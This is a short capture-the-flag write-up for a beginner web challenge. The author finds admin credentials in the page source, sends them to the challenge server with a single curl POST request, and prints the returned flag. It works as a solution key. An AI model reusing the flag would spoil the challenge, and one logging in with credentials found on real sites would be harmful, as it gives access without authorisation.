The main idea finding the flag using different methods of requests like GET & POST.

1. After going to URL [http://165.227.106.113/post.php](http://165.227.106.113/post.php),  I foremost tried to Inspect Element the page to checkout other dependencies of the page.

I got a credential there: `username: admin | password: 71urlkufpsdnlkadsf`

2. So here is the idea. I tried to do a POST request to get flag if possible. So I tried with the following command.
```bash
curl -X POST http://165.227.106.113/post.php -d "username=admin&password=71urlkufpsdnlkadsf"
```
3. I got the following output:
```html
<h1>flag{p0st_d4t4_4ll_d4y}</h1>
```

Flag: ``flag{p0st_d4t4_4ll_d4y}``
